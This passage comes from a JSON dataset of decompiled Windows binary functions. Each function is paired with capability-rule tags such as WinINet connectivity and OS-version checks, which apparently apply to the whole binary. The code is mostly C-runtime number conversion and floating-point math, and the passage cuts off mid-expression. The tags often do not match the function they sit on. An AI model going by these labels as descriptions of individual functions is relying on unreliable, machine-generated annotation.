        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0049927e(uint *param_1)\n\n{\n    uint arg_8h;\n    uint8_t uVar1;\n    uint arg_10h;\n    int32_t var_474h;\n    uint var_470h;\n    uint var_468h;\n    uint32_t var_464h;\n    uint var_460h;\n    uint var_45ch;\n    uint var_41ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    arg_8h = **param_1;\n    uVar1 = fcn.00404264(arg_8h);\n    var_464h = var_464h & 0xffffff00 | uVar1;\n    fcn.004057e5(*param_1[1]);\n    var_460h = **param_1;\n    arg_10h = param_1[2][1];\n    fcn.00401a1e(&var_460h, *param_1[2], arg_10h, *param_1[3], &var_470h, *param_1[4]);\n    var_ch = 0;\n    fcn.00403143();\n    fcn.00404647();\n    if (var_468h != '\\0') {\n        *(var_474h + 0x350) = *(var_474h + 0x350) & 0xfffffffd;\n    }\n    fcn.00405943(var_464h, arg_8h);\n    fcn.00403085(arg_10h);\n    return;\n}\n",
        "token_count": 371
    },
    "004b230a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.004b230a(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    float10 fVar3;\n    uint arg_ch_00;\n    uint arg_10h_00;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_ch;\n    float var_4h;\n    \n    if (arg_ch != NULL) {\n        *arg_ch = arg_8h;\n    }\n    if (arg_8h == 0) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        fVar3 = 0;\n    }\n    else {\n        fcn.004057e5(arg_10h);\n        puVar1 = &var_4h;\n        var_4h = 0.0;\n        arg_ch_00 = extraout_ECX;\n        arg_10h_00 = extraout_ECX;\n        fcn.00405119(&stack0xffffffcc, arg_8h, arg_ch);\n        iVar2 = fcn.004037d3(&var_14h, arg_ch_00, arg_10h_00, puVar1);\n        if ((iVar2 == 3) || (iVar2 == 2)) {\n            puVar1 = fcn.004039a4();\n            *puVar1 = 0x22;\n        }\n        if (var_ch != '\\0') {\n            *(var_18h + 0x350) = *(var_18h + 0x350) & 0xfffffffd;\n        }\n        fVar3 = var_4h;\n    }\n    return fVar3;\n}\n",
        "token_count": 413
    },
    "004b23bc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.004b23bc(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    float10 fVar3;\n    uint arg_ch_00;\n    uint arg_10h_00;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_ch;\n    float var_4h;\n    \n    if (arg_ch != NULL) {\n        *arg_ch = arg_8h;\n    }\n    if (arg_8h == 0) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        fVar3 = 0;\n    }\n    else {\n        fcn.004057e5(arg_10h);\n        puVar1 = &var_4h;\n        var_4h = 0.0;\n        arg_ch_00 = extraout_ECX;\n        arg_10h_00 = extraout_ECX;\n        fcn.00405885(&stack0xffffffcc, arg_8h, arg_ch);\n        iVar2 = fcn.00405e89(&var_14h, arg_ch_00, arg_10h_00, puVar1);\n        if ((iVar2 == 3) || (iVar2 == 2)) {\n            puVar1 = fcn.004039a4();\n            *puVar1 = 0x22;\n        }\n        if (var_ch != '\\0') {\n            *(var_18h + 0x350) = *(var_18h + 0x350) & 0xfffffffd;\n        }\n        fVar3 = var_4h;\n    }\n    return fVar3;\n}\n",
        "token_count": 413
    },
    "004b246e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.004b246e(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    float10 fVar3;\n    uint arg_ch_00;\n    uint arg_10h_00;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    \n    if (arg_ch != NULL) {\n        *arg_ch = arg_8h;\n    }\n    if (arg_8h == 0) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        fVar3 = 0;\n    }\n    else {\n        fcn.004057e5(arg_10h);\n        puVar1 = &var_ch;\n        _var_ch = 0.0;\n        arg_ch_00 = extraout_ECX;\n        arg_10h_00 = extraout_ECX;\n        fcn.00405119(&stack0xffffffc8, arg_8h, arg_ch);\n        iVar2 = fcn.004018c5(&var_18h, arg_ch_00, arg_10h_00, puVar1);\n        if ((iVar2 == 3) || (iVar2 == 2)) {\n            puVar1 = fcn.004039a4();\n            *puVar1 = 0x22;\n        }\n        fVar3 = _var_ch;\n        if (var_10h != '\\0') {\n            *(var_1ch + 0x350) = *(var_1ch + 0x350) & 0xfffffffd;\n        }\n    }\n    return fVar3;\n}\n",
        "token_count": 412
    },
    "004b2519": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.004b2519(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    float10 fVar3;\n    uint arg_ch_00;\n    uint arg_10h_00;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    \n    if (arg_ch != NULL) {\n        *arg_ch = arg_8h;\n    }\n    if (arg_8h == 0) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        fVar3 = 0;\n    }\n    else {\n        fcn.004057e5(arg_10h);\n        puVar1 = &var_ch;\n        _var_ch = 0.0;\n        arg_ch_00 = extraout_ECX;\n        arg_10h_00 = extraout_ECX;\n        fcn.00405885(&stack0xffffffc8, arg_8h, arg_ch);\n        iVar2 = fcn.00401604(&var_18h, arg_ch_00, arg_10h_00, puVar1);\n        if ((iVar2 == 3) || (iVar2 == 2)) {\n            puVar1 = fcn.004039a4();\n            *puVar1 = 0x22;\n        }\n        fVar3 = _var_ch;\n        if (var_10h != '\\0') {\n            *(var_1ch + 0x350) = *(var_1ch + 0x350) & 0xfffffffd;\n        }\n    }\n    return fVar3;\n}\n",
        "token_count": 411
    },
    "004ba12d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004d4a07)\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.004ba12d(uint32_t param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    double dVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint uVar3;\n    char extraout_CL;\n    char extraout_CL_00;\n    uint32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t iVar4;\n    int32_t extraout_ECX_01;\n    bool bVar5;\n    uint16_t in_FPUControlWord;\n    uint16_t in_FPUStatusWord;\n    float10 extraout_ST0;\n    float10 extraout_ST0_00;\n    float10 fVar6;\n    float10 extraout_ST0_01;\n    float10 extraout_ST1;\n    float10 extraout_ST1_00;\n    float10 extraout_ST1_01;\n    float10 fVar7;\n    unkbyte10 in_ST6;\n    unkbyte10 in_ST7;\n    uint unaff_retaddr;\n    uchar auStack120 [12];\n    uint16_t uStack108;\n    uchar auStack14 [10];\n    uint32_t arg_8h;\n    \n    arg_8h = in_EAX & 0xffff0000 | in_FPUControlWord;\n    uVar2 = in_EAX;\n    if (in_FPUControlWord != 0x27f) {\n        auStack14 = CONCAT46(0x4ba141, auStack14._0_6_);\n        in_EAX = fcn.00402ab8();\n        uVar2 = extraout_ECX;\n    }\n    bVar5 = (uVar2 & 0x7ff00000) == 0x7ff00000;\n    if (bVar5) {\n        if ((in_EAX & 0xfffff | param_3) == 0) {\n            auStack14 = CONCAT46(0x4ba209, auStack14._0_6_);\n            fVar6 = fcn.0040332d();\n            iVar4 = extraout_ECX_01;\n            fVar7 = extraout_ST1_01;\n            in_ST6 = in_ST7;\n        }\n        else {\n            auStack14 = CONCAT46(0x4ba1cd, auStack14._0_6_);\n            uVar2 = fcn.0040332d();\n            in_FPUStatusWord = in_FPUStatusWord & 0xfdff;\n            if (1 == extraout_ST0_01) goto code_r0x004ba1e3;\n            iVar4 = extraout_ECX_00 + 1;\n            fVar6 = extraout_ST0_01;\n            fVar7 = extraout_ST1_00;\n        }\ncode_r0x004ba209:\n        uVar2 = param_2 & 0x7ff00000;\n        if ((uVar2 == 0x7ff00000) && ((param_2 & 0xfffff | param_1) != 0)) {\n            fVar6 = 0;\n            uVar2 = ((fVar7 < fVar6) << 9 | (fVar7 != fVar6) << 10 | (fVar7 == fVar6) << 0xe) | 0x7ff00000;\n            if ((fVar7 == fVar6) != 0) {\ncode_r0x004ba1e3:\n                return CONCAT44(arg_8h, uVar2);\n            }\ncode_r0x004ba1eb:\n            return CONCAT44(arg_8h, uVar2);\n        }\n        if (iVar4 != 0) goto code_r0x004ba1eb;\n        uStack108 = in_FPUStatusWord;\n        auStack14 = in_ST6;\n        uVar2 = fcn.00406267(SUB84(fVar6, 0), fVar6 >> 0x20, SUB84(fVar7, 0), fVar7 >> 0x20, auStack120);\n        if (uVar2 == 0) goto code_r0x00402b44;\n        uVar2 = 1;\n    }\n    else {\n        auStack14 = CONCAT46(0x4ba15c, auStack14._0_6_);\n        uVar2 = fcn.0040332d();\n        if (bVar5) {\n            iVar4 = 0;\n            fVar6 = extraout_ST0;\n            fVar7 = extraout_ST1;\n            in_ST6 = in_ST7;\n            goto code_r0x004ba209;\n        }\n        if (((uVar2 & 0x7ff00000) != 0) || ((param_2 & 0xfffff | param_1) != 0)) {\n            if ((param_2 & 0x80000000) != 0) {\n                auStack14 = CONCAT46(0x4ba2d3, auStack14._0_6_);\n                fcn.004ba2f1();\n                if (extraout_CL_00 == '\\0') {\n                    uVar2 = 1;\n                    goto code_r0x004ba1a5;\n                }\n            }\n            auStack14 = CONCAT46(0x4ba181, auStack14._0_6_);\n            uVar2 = fcn.00401613();\n            fVar6 = extraout_ST0_00;\n            if (extraout_CL == '\\x01') {\n                fVar6 = -extraout_ST0_00;\n            }\n            if (*0x5705dc == 0) {\n                dVar1 = fVar6;\n                auStack14 = CONCAT82(dVar1, auStack14._0_2_);\n                auStack14._6_4_ = dVar1 >> 0x20;\n                auStack14._6_4_ = auStack14._6_4_ & 0x7ff00000;\n                if ((dVar1 & 0x7ff0000000000000) == 0) {\n                    fscale(fVar6, *0x55487c);\n                }\n                else {\n                    if (auStack14._6_4_ != 0x7ff00000) {\n                        uVar2 = auStack14._6_4_ | arg_8h & 0xffff;\n                        if (arg_8h != 0x27f) {\n                            if (((arg_8h & 0x20) == 0) &&\n                               (uVar2 = auStack14._6_4_ | in_FPUStatusWord,  (in_FPUStatusWord & 0x20) != 0))\n                            goto code_r0x004d4a0e;\n                            uVar2 = uVar2 & 0xffff0020;\n                        }\n                        return CONCAT44(arg_8h, uVar2);\n                    }\n                    fscale(fVar6, *0x554874);\n                }\ncode_r0x004d4a0e:\n                auStack14 = CONCAT46(0x4d4a13, auStack14._0_6_);\n                uVar3 = fcn.004027ac(arg_8h, unaff_retaddr, param_1, param_2, param_3, param_4);\n                return CONCAT44(arg_8h, uVar3);\n            }\n            goto code_r0x00402b44;\n        }\n        uVar2 = param_4 & 0x7fffffff | param_3;\n        if (uVar2 == 0) goto code_r0x00402b44;\n        auStack14 = CONCAT46(0x4ba28b, auStack14._0_6_);\n        uVar2 = fcn.004ba2f1();\n        if ((param_4 >> 0x18 & 0x80) == 0) goto code_r0x00402b44;\n        uVar2 = 2;\n    }\ncode_r0x004ba1a5:\n    if (*0x5705dc == 0) {\n        auStack14 = CONCAT46(0x4ba1c2, auStack14._0_6_);\n        uVar3 = fcn.004027ac(arg_8h, unaff_retaddr, param_1, param_2, param_3, param_4);\n        return CONCAT44(arg_8h, uVar3);\n    }\ncode_r0x00402b44:\n    return CONCAT44(arg_8h, uVar2);\n}\n",
        "token_count": 1885
    },
    "004c4046": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c4046(int32_t arg_8h)\n\n{\n    int32_t in_FS_OFFSET;\n    int32_t var_4h;\n    \n    if (*0x57048c == 0) {\n        var_4h = arg_8h;\n        if (-1 < *(*(*(in_FS_OFFSET + 0x30) + 0x10) + 8)) {\n            fcn.004036f2(&var_4h);\n        }\n        *0x57048c = (var_4h == 1) + 1;\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "004c4099": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c4099(int32_t arg_8h)\n\n{\n    int32_t in_FS_OFFSET;\n    int32_t var_4h;\n    \n    if (*0x570490 == 0) {\n        var_4h = arg_8h;\n        if (-1 < *(*(*(in_FS_OFFSET + 0x30) + 0x10) + 8)) {\n            fcn.00402cde(&var_4h);\n        }\n        *0x570490 = (var_4h == 1) + 1;\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "004c94dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004c94dc(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_19h;\n    \n    if (*(unaff_EBP + -0x19) != '\\0') {\n        fcn.00401cbc(3);\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "004c9a65": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004c9a65(int32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_8h_00;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    if (iVar2 != 0) {\n        if (arg_8h != 0) {\n            fcn.00401b4a(arg_8h);\n        }\n        iVar3 = fcn.00401ae6();\n        if (iVar3 != 1) {\n            return 4;\n        }\n    }\n    iVar3 = fcn.00404b7e();\n    if ((iVar3 == 2) && (cVar1 = fcn.00402e19(),  cVar1 != '\\0')) {\n        cVar1 = fcn.00404d3b();\n        if (cVar1 == '\\0') {\n            arg_10h = arg_10h | 0x200000;\n            arg_8h_00 = 0;\n        }\n        else {\n            arg_8h_00 = fcn.00401aa5();\n        }\n        iVar2 = fcn.004042b4(arg_8h_00, arg_8h, arg_ch, arg_10h);\n        return iVar2;\n    }\n    return (iVar2 != 0) + 3;\n}\n",
        "token_count": 323
    },
    "004d34f9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.004d34f9(double param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint uVar10;\n    bool bVar11;\n    double dVar12;\n    double dVar13;\n    ulong in_XMM1_Qa;\n    double dVar14;\n    uchar auVar15 [16];\n    uint64_t in_XMM2_Qa;\n    int64_t iVar16;\n    uchar auVar17 [16];\n    int64_t iVar18;\n    uint64_t in_XMM3_Qa;\n    uint64_t uVar19;\n    double dVar20;\n    double dVar21;\n    double dVar22;\n    double dVar23;\n    double dVar24;\n    double dVar25;\n    double dVar26;\n    uchar auStack12 [4];\n    \n    dVar12 = param_1 >> 0x2c;\n    uVar1 = param_1 >> 0x30;\n    uVar3 = (SUB82(dVar12, 0) & 0xff) + 1 & 0x1fe;\n    dVar25 = (*0x5546b0 & param_1 | *0x5546c0) * *(uVar3 * 4 + 0x557378);\n    dVar22 = *(uVar3 * 4 + 0x557378);\n    dVar13 = *(uVar3 * 8 + 0x557860);\n    dVar24 = *(uVar3 * 8 + 0x557868);\n    uVar7 = 0x7fef - uVar1;\n    uVar3 = SUB84(param_1, 0);\n    uVar9 = param_1 >> 0x20;\n    dVar23 = param_1;\n    if ((uVar1 - 0x10 | uVar7) < 0x80000000) {\n        uVar7 = 0;\n        uVar8 = 0x3fe7f;\ncode_r0x004d3576:\n        uVar4 = (dVar25 >> 0x26 & 0xff) + 1 & 0x1fe;\n        dVar25 = dVar25 * *(uVar4 * 4 + 0x558210);\n        dVar20 = dVar23 & *0x5546b0 | *0x5546c0;\n        dVar14 = *0x554708 & dVar20;\n        in_XMM3_Qa = in_XMM3_Qa >> 0x1f;\n        dVar20 = dVar20 - dVar14;\n        uVar5 = (dVar25 >> 0x1f & 0x1ff) + 1 & 0x3fe;\n        dVar21 = dVar22 * *(uVar4 * 4 + 0x558210) * *(uVar5 * 4 + 0x5590a0);\n        dVar25 = dVar25 * *(uVar5 * 4 + 0x5590a0);\n        dVar23 = dVar13 + *(uVar4 * 8 + 0x5586f0) + (dVar12 - uVar8 >> 8) + *(uVar5 * 8 + 0x559a50);\n        dVar12 = dVar24 + *(uVar4 * 8 + 0x5586f8) + *(uVar5 * 8 + 0x559a58);\n        dVar13 = *0x554708 & dVar21;\n        dVar21 = dVar21 - dVar13;\n        dVar26 = *0x554710 + dVar25;\n        dVar24 = dVar23 + dVar26;\n        dVar22 = CONCAT44(param_3, param_2);\n        uVar2 = param_3 >> 0x10;\n        dVar23 = dVar23 - dVar24;\n        uVar4 = dVar24 >> 0x30;\n        dVar13 = (((dVar25 - dVar13 * dVar14) - dVar14 * dVar21) - dVar13 * dVar20) - dVar20 * dVar21;\n        dVar14 = dVar26 - dVar13;\n        dVar25 = dVar24 - dVar13;\n        uVar8 = uVar2 & 0x7ff0;\n        if (uVar8 < 0x7ff0) {\n            iVar6 = (uVar8 - 0x3ff0) + (uVar4 & 0x7ff0);\n            if ((0x40a0U - iVar6 | iVar6 - 0x3c70U) < 0x80000000) {\ncode_r0x004d36c8:\n                dVar20 = *0x554708 & dVar22;\n                dVar21 = *0x554708 & dVar25;\n                dVar13 = (dVar23 + dVar26) - (dVar13 - (dVar24 - dVar25));\n                auVar17 = pinsrw(ZEXT816(0), 0x4060, 3);\n                dVar24 = dVar20 * dVar21 * SUB168(auVar17, 0);\n                uVar3 = ROUND(dVar24);\n                dVar22 = dVar20 * (dVar25 - dVar21) + dVar21 * (dVar22 - dVar20) + (dVar25 - dVar21) * (dVar22 - dVar20)\n                ;\n                if (0 < (0x1ff7f - uVar3 | uVar3 + 0x1e1ff)) {\n                    iVar6 = (uVar3 & 0x7f) * 0x10;\n                    auVar17 = pinsrw(ZEXT816(0), 0x3f80, 3);\n                    uVar3 = ((uVar7 + uVar3 & 0xffffff80) + 0x1ff80 << 0x2d) >> 0x20;\n                    dVar25 = *(iVar6 + 0x55add0) * (uVar3 << 0x20);\n                    dVar22 = (dVar24 - ((dVar24 + *0x5546a0) - *0x5546a0)) * SUB168(auVar17, 0) +\n                             dVar22 + ((*0x55ada0 * dVar14 + *0x55adb0 * dVar14 * dVar14) * dVar14 * dVar14 +\n                                       *0x55ada8 * dVar14 + str._aAiFC.._0_8_ * dVar14 * dVar14 + dVar12 + dVar13) *\n                                      CONCAT44(param_3, param_2);\n                    return dVar22 * dVar22 * dVar25 * (*0x5546f0 + *0x5546e0 * dVar22) * dVar22 * dVar22 +\n                           *(iVar6 + 0x55add8) * SUB128((ZEXT412(uVar3) << 0x40) >> 0x20, 0) +\n                           (*0x5546f8 + *0x5546e8 * dVar22) * dVar22 * dVar22 * dVar25 + *0x554700 * dVar22 * dVar25 +\n                           dVar25;\n                }\n                if (uVar3 < 1) {\n                    if (uVar3 < -0x3fdff) {\ncode_r0x004d3f27:\n                        uVar10 = 0x19;\n                        _auStack12 = *0x554748 * *0x554748 | uVar7 << 0x2d;\n                        goto code_r0x004d3cce;\n                    }\n                    uVar7 = uVar7 + 0x80;\n                    uVar9 = (uVar3 & 0xffffff80) + 0x3fe80;\n                    uVar10 = 0;\n                }\n                else {\n                    if (0x3ffff < uVar3) goto code_r0x004d3f4a;\n                    uVar7 = uVar7 + 0x3ff00;\n                    uVar9 = uVar3 - 0x80 & 0xffffff80;\n                    uVar10 = 0x3ff0;\n                }\n                iVar6 = (uVar3 & 0x7f) * 0x10;\n                uVar3 = (-(uVar9 - 0x1ff80) >> 7) + 2;\n                auVar17 = pinsrw(ZEXT816(0), 0x3f80, 3);\n                uVar8 = (uVar9 << 0x2d) >> 0x20;\n                dVar25 = *(iVar6 + 0x55add0) * (uVar8 << 0x20);\n                dVar22 = (dVar24 - ((dVar24 + *0x5546a0) - *0x5546a0)) * SUB168(auVar17, 0) +\n                         dVar22 + ((*0x55ada0 * dVar14 + *0x55adb0 * dVar14 * dVar14) * dVar14 * dVar14 +\n                                   *0x55ada8 * dVar14 + str._aAiFC.._0_8_ * dVar14 * dVar14 + dVar12 + dVar13) *\n                                  CONCAT44(param_3, param_2);\n                _auStack12 = uVar7 << 0x2d;\n                uVar19 = uVar3 + (uVar3 & 0x20);\n                dVar13 = -1 << uVar19 & dVar25;\n                dVar22 = dVar22 * dVar22 * dVar25 * (*0x5546f0 + *0x5546e0 * dVar22) * dVar22 * dVar22 +\n                         *(iVar6 + 0x55add8) * SUB128((ZEXT412(uVar8) << 0x40) >> 0x20, 0) +\n                         (*0x5546f8 + *0x5546e8 * dVar22) * dVar22 * dVar22 * dVar25 + *0x554700 * dVar22 * dVar25;\n                dVar24 = dVar13 + dVar22 & -1 << uVar19;\n                auVar17 = pinsrw(ZEXT816(0), uVar10, 3);\n                dVar22 = dVar22 + (dVar13 - dVar24) + (dVar25 - dVar13);\n                if (uVar9 - 0x1ff80 < 1) {\n                    _auStack12 = dVar22 * _auStack12 + dVar24 * _auStack12;\n                    _auStack12 = _auStack12 + SUB168(auVar17, 0) * _auStack12;\n                    uVar10 = 0x18;\n                    if (((_auStack12 >> 0x30 & 0x7ff0) != 0x7ff0) &&\n                       (uVar10 = 0x19,  (_auStack12 & 0x7ff0000000000000) != 0)) {\n                        return _auStack12;\n                    }\n                }\n                else {\n                    _auStack12 = (dVar22 + dVar24) * _auStack12;\n                    _auStack12 = _auStack12 + SUB168(auVar17, 0) * _auStack12;\n                    uVar10 = 0x18;\n                    if (((_auStack12 >> 0x30 & 0x7ff0) != 0x7ff0) &&\n                       (uVar10 = 0x19,  (_auStack12 & 0x7ff0000000000000) != 0)) {\n                        return _auStack12;\n                    }\n                }\n            }\n            else {\n                dVar24 = dVar22 * dVar25;\n                uVar3 = dVar24 >> 0x30 & 0x7ff0;\n                uVar9 = uVar3 - 0x3c70;\n                if ((0x40a0 - uVar3 | uVar9) < 0x80000000) goto code_r0x004d36c8;\n                if (0x7fffffff < uVar9) {\n                    return (uVar7 | 0x1ff80) << 0x2d;\n                }\n                if (((uVar2 ^ (uVar1 & 0x7ff0) + 0xc010) & 0x8000) != 0) goto code_r0x004d3f27;\ncode_r0x004d3f4a:\n                uVar10 = 0x18;\n                if (uVar7 == 0) {\n                    _auStack12 = *0x554740 * *0x554740;\n                }\n                else {\n                    _auStack12 = *0x554738 * *0x554740;\n                }\n            }\n            goto code_r0x004d3cce;\n        }\n        auVar17 = CONCAT88(in_XMM2_Qa, CONCAT44(param_3, param_2));\n        bVar11 = uVar3 == 0;\n        uVar3 = uVar4;\n        if (bVar11) {\n            if (uVar9 == 0x3ff00000) goto code_r0x004d3ccb;\n            uVar3 = uVar9;\n            if (uVar9 == 0xbff00000) {\n                return 1;\n            }\n        }\n    }\n    else {\n        auVar17 = CONCAT88(in_XMM2_Qa, CONCAT44(param_3, param_2));\n        uVar8 = param_3 & *0x5546d4;\n        uVar19 = in_XMM3_Qa >> 0x20;\n        if (uVar8 < 0x7ff00000) {\n            if ((param_2 | uVar8) == 0) {\n                uVar10 = 0x1a;\n                _auStack12 = *0x5546c0;\n                if ((uVar3 | uVar9 & 0x7fffffff) != 0) {\n                    uVar10 = 0x1d;\n                    if (((uVar9 & 0x7fffffff) < 0x7ff00001) && (((uVar9 & 0x7fffffff) < 0x7ff00000 || (uVar3 == 0)))) {\n                        return *0x5546c0;\n                    }\n                }\n                goto code_r0x004d3cce;\n            }\n            if (uVar7 < 0) {\n                auVar17 = auVar17 | CONCAT88(in_XMM3_Qa << 0x34, CONCAT44(*0x5546d4, *0x5546d0) << 0x34);\n                in_XMM3_Qa = 0;\n                auVar15 = pmaxsw(ZEXT1216(CONCAT48((in_XMM1_Qa >> 0x20 & uVar19) >> 0x14, (uVar8 >> 0x14) - 0x3f3)), 0x0\n                                );\n                iVar16 = SUB168(auVar17, 0) << SUB168(auVar15, 0);\n                iVar18 = SUB168(auVar17 >> 0x40, 0) << SUB168(auVar15 >> 0x40, 0);\n                auVar17 = CONCAT412(-(iVar18 >> 0x20 == 0), \n                                    CONCAT48(-(iVar18 == 0), CONCAT44(-(iVar16 >> 0x20 == 0), -(iVar16 == 0))));\n                uVar2 = SUB161(auVar17 >> 7, 0) & 1 | (SUB161(auVar17 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar17 >> 0x17, 0) & 1) << 2 | (SUB161(auVar17 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar17 >> 0x27, 0) & 1) << 4 | (SUB161(auVar17 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar17 >> 0x37, 0) & 1) << 6 | (SUB161(auVar17 >> 0x3f, 0) & 1) << 7;\n                uVar8 = 0x7fef - uVar7 & 0x7fff;\n                uVar19 = SUB168(auVar17 >> 0x40, 0);\n                if (0x7fef < uVar8) {\n                    auVar17 = 